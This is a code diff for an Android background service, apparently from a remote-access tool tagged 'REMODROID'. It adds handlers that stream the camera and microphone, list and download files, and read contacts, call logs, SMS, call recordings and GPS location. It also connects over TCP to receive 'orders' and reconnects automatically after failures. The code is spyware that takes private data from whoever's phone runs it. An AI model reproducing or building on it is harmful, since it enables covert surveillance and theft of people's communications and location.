@@ -1,15 +1,18 @@
-package com.remo.connections;
+package com.remo;
 
 import android.app.Service;
 import android.content.Intent;
 import android.os.IBinder;
 import android.util.Log;
+import com.remo.connections.DataHandler;
+import com.remo.connections.TCP_Transceiver;
+import com.remo.features.*;
 
-public class MainConnectionService extends Service {
+public class MainService extends Service {
     private Thread mainThread = null;
     private TCP_Transceiver tcp_transceiver;
 
-    public MainConnectionService() {
+    public MainService() {
     }
     @Override
     public IBinder onBind(Intent intent) {
@@ -17,6 +20,20 @@ public class MainConnectionService extends Service {
         throw new UnsupportedOperationException("Not yet implemented");
     }
 
+
+    private void init(){
+
+        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CAM.ordinal(),CamStream.class);
+        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.MIC.ordinal(),MicStream.class);
+        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.FM_LIST.ordinal(),FileMan.class);
+        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.FM_DOWN.ordinal(),FileDownloader.class);
+        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.INFO.ordinal(),MobileInfo.class);
+        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CONTACTS.ordinal(),Contacts.class);
+        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CALL_LOG.ordinal(),Call_Log.class);
+        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.SMS.ordinal(),SMS.class);
+        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CALL_RECORDS.ordinal(),CallRecordsList.class);
+        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.GPS.ordinal(),GPS.class);
+    }
 
     @Override
     public int onStartCommand(final Intent intent, int flags, int startId) {
@@ -26,6 +43,7 @@ public class MainConnectionService extends Service {
             @Override
             public void run() {
                 tcp_transceiver = new TCP_Transceiver(true);
+                init();
                 tcp_transceiver.connect();
                 Log.d("REMODROID", "Receiving Orders");
                 while (true) {
@@ -41,6 +59,7 @@ public class MainConnectionService extends Service {
 
                     } catch (Exception ex) {
                         Log.e("REMODROID","Receive Exception: " + ex.getMessage());
+                        init();
                         tcp_transceiver.connect();
                         break;
                     }
@@ -51,6 +70,7 @@ public class MainConnectionService extends Service {
             @Override
             public void uncaughtException(Thread t, Throwable e) {
                 Log.e("REMODROID", "UncaughtException :" + e.getMessage());
+                init();
                 tcp_transceiver.connect();
             }
         });
